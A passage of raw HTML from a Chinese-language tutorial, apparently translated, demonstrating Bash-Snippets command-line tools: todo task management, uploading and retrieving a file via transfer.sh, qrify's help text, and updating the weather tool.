class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ todo -r 2\r\nSucessfully removed task number 2\r\n01). The first task Tue Jun 26 14:51:30 IST 2018</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83df6470852889-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d83df6470852889-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d83df6470852889-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83df6470852889-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">todo</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">r</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d83df6470852889-2\"><span class=\"crayon-e\">Sucessfully </span><span class=\"crayon-e\">removed </span><span class=\"crayon-e\">task </span><span class=\"crayon-i\">number</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span></div><div class=\"crayon-line\" id=\"crayon-5bab670d83df6470852889-3\"><span class=\"crayon-cn\">01</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">The </span><span class=\"crayon-e\">first </span><span class=\"crayon-e\">task </span><span class=\"crayon-e\">Tue </span><span class=\"crayon-i\">Jun</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">26</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">14</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">51</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">30</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">IST</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2018</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n<p>要清除所有任务，运行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d83df9089648852\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ todo -c\r\nTasks cleared.</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83df9089648852-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d83df9089648852-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83df9089648852-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">todo</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">c</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d83df9089648852-2\"><span class=\"crayon-e\">Tasks </span><span class=\"crayon-v\">cleared</span><span class=\"crayon-sy\">.</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p></p>\n<h4 id=\"toc_21\">19、 Transfer</h4>\n<p>Transfer 脚本允许你通过互联网快速轻松地传输文件和目录。</p>\n<p>让我们上传一个文件：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d83dfc618144030\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ transfer test.txt\r\nUploading test.txt\r\n################################################################################################################################################ 100.0%\r\nSuccess!\r\nTransfer Download Command: transfer -d desiredOutputDirectory ivmfj test.txt\r\nTransfer File URL: https://transfer.sh/ivmfj/test.txt</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83dfc618144030-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d83dfc618144030-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d83dfc618144030-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d83dfc618144030-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d83dfc618144030-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d83dfc618144030-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83dfc618144030-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">transfer </span><span class=\"crayon-v\">test</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d83dfc618144030-2\"><span class=\"crayon-e\">Uploading </span><span class=\"crayon-v\">test</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">txt</span></div><div class=\"crayon-line\" id=\"crayon-5bab670d83dfc618144030-3\"><span class=\"crayon-p\">################################################################################################################################################ 100.0%</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d83dfc618144030-4\"><span class=\"crayon-v\">Success</span><span class=\"crayon-o\">!</span></div><div class=\"crayon-line\" id=\"crayon-5bab670d83dfc618144030-5\"><span class=\"crayon-e\">Transfer </span><span class=\"crayon-e\">Download </span><span class=\"crayon-v\">Command</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">transfer</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">d</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">desiredOutputDirectory </span><span class=\"crayon-e\">ivmfj </span><span class=\"crayon-v\">test</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d83dfc618144030-6\"><span class=\"crayon-e\">Transfer </span><span class=\"crayon-e\">File </span><span class=\"crayon-v\">URL</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">https</span><span class=\"crayon-o\">:</span><span class=\"crayon-c\">//transfer.sh/ivmfj/test.txt</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0012 seconds] -->\r\n<p>该文件将上传到 transfer.sh 站点。Transfer.sh 允许你一次上传最大 <strong>10 GB</strong> 的文件。所有共享文件在 <strong>14 天</strong>后自动过期。如你所见，任何人都可以通过 Web 浏览器访问 URL 或使用 transfer 目录来下载文件，当然，transfer 必须安装在他/她的系统中。</p>\n<p>现在从你的系统中移除文件。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d83e00147856127\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ rm -fr test.txt</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83e00147856127-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83e00147856127-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">rm</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">fr </span><span class=\"crayon-v\">test</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">txt</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>现在，你可以随时（14 天内）从 transfer.sh 站点下载该文件，如下所示：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d83e03708729208\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ transfer -d Downloads ivmfj test.txt</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83e03708729208-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83e03708729208-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">transfer</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">d</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Downloads </span><span class=\"crayon-e\">ivmfj </span><span class=\"crayon-v\">test</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">txt</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>获取关于此实用脚本的更多详情，参考以下指南。</p>\n<ul>\n<li><a href=\"https://www.ostechnix.com/easy-fast-way-share-files-internet-command-line/\">用命令行在互联网上共享文件的一个简单快捷方法</a></li>\n</ul>\n<h3 id=\"toc_22\">获得帮助</h3>\n<p>如果你不知道如何使用特定脚本，只需输入该脚本的名称，然后按下 ENTER 键，你将会看到使用细节。以下示例显示 Qrify 脚本的帮助信息。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d83e06792118081\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ qrify\r\nQrify\r\nUsage: qrify [stringtoturnintoqrcode]\r\nDescription: Converts strings or urls into a qr code.\r\n -u Update Bash-Snippet Tools\r\n -m Enable multiline support (feature not working yet)\r\n -h Show the help\r\n -v Get the tool version\r\nExamples:\r\n qrify this is a test string\r\n qrify -m two\\\\nlines\r\n qrify github.com # notice no http:// or https:// this will fail\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83e06792118081-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d83e06792118081-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d83e06792118081-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d83e06792118081-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d83e06792118081-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d83e06792118081-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d83e06792118081-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d83e06792118081-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d83e06792118081-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d83e06792118081-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d83e06792118081-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d83e06792118081-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d83e06792118081-13\">13</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83e06792118081-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">qrify</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d83e06792118081-2\"><span class=\"crayon-e\">Qrify</span></div><div class=\"crayon-line\" id=\"crayon-5bab670d83e06792118081-3\"><span class=\"crayon-v\">Usage</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">qrify</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">stringtoturnintoqrcode</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d83e06792118081-4\"><span class=\"crayon-v\">Description</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Converts </span><span class=\"crayon-e\">strings </span><span class=\"crayon-st\">or</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">urls </span><span class=\"crayon-i\">into</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">qr </span><span class=\"crayon-v\">code</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-5bab670d83e06792118081-5\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">u</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Update </span><span class=\"crayon-v\">Bash</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">Snippet </span><span class=\"crayon-v\">Tools</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d83e06792118081-6\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">m</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Enable </span><span class=\"crayon-e\">multiline </span><span class=\"crayon-e\">support</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">feature </span><span class=\"crayon-st\">not</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">working </span><span class=\"crayon-v\">yet</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab670d83e06792118081-7\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">h</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Show </span><span class=\"crayon-e\">the </span><span class=\"crayon-v\">help</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d83e06792118081-8\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">v</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Get </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">tool </span><span class=\"crayon-e\">version</span></div><div class=\"crayon-line\" id=\"crayon-5bab670d83e06792118081-9\"><span class=\"crayon-v\">Examples</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d83e06792118081-10\"><span class=\"crayon-h\"> </span><span class=\"crayon-e\">qrify </span><span class=\"crayon-r\">this</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">is</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">test </span><span class=\"crayon-t\">string</span></div><div class=\"crayon-line\" id=\"crayon-5bab670d83e06792118081-11\"><span class=\"crayon-h\"> </span><span class=\"crayon-v\">qrify</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">m</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">two</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-e\">nlines</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d83e06792118081-12\"><span class=\"crayon-e\"> </span><span class=\"crayon-e\">qrify </span><span class=\"crayon-v\">github</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># notice no http:// or https:// this will fail</span></div><div class=\"crayon-line\" id=\"crayon-5bab670d83e06792118081-13\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0040 seconds] -->\r\n<p></p>\n<h3 id=\"toc_23\">更新脚本</h3>\n<p>你可以随时使用 <code>-u</code> 选项更新已安装的工具。以下命令更新 “weather” 工具。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d83e0a245613750\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ weather -u</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83e0a245613750-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83e0a245613750-1\"><span class=\"crayon-sy\">$</span><span 